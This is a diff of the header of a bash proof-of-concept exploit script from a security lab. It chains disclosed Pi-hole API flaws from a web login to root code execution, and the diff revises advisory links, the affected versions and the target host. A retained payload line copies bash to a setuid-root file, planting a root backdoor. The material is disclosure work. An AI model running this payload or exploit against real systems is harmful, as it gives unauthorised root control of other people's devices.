@@ -1,15 +1,19 @@
 #!/bin/bash
 #
-# LinnemanLabs - pi-hole end-to-end web session to root code exec
+# LinnemanLabs - pi-hole dnsmasq and logrotate (or cap_chown), end-to-end web session to root code exec
 # CVE-2026-50130, CVE-2026-65963, 3 more TBD
 #
-# https://linnemanlabs.com/pi-hole-root-with-extra-steps
+# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
 # https://github.com/linnemanlabs/advisories/
+#
+# dnsmasq advisory: https://github.com/pi-hole/FTL/security/advisories/GHSA-ww5x-xx4x-qvjr
+# cap_chown advisory: https://github.com/pi-hole/pi-hole/security/advisories/GHSA-j8vh-6fp9-cjcx
+# logrotate advisory: https://github.com/pi-hole/pi-hole/security/advisories/GHSA-h8w9-qx2v-wrww
 #
 # all via api. run with web login credentials. depending what target pihole is vulnerable to this
 # is either immediate root code exec or delayed/staged code exec. Read advisories for more info.
 #
-# works on v6.0.0 - current
+# works on FTL v6.0.0 - v6.7
 #
 # Login
 # -> Take backup
@@ -28,7 +32,7 @@
 #
 # everything here is also doable from the web UI
 #
-PIHOST="http://192.168.1.1"
+PIHOST="http://pi.hole"
 PIPASS="password"
 ROOTCMD="id > /tmp/root-proof 2>&1; cp /bin/bash /var/rootsh; chmod 4755 /var/rootsh"
 
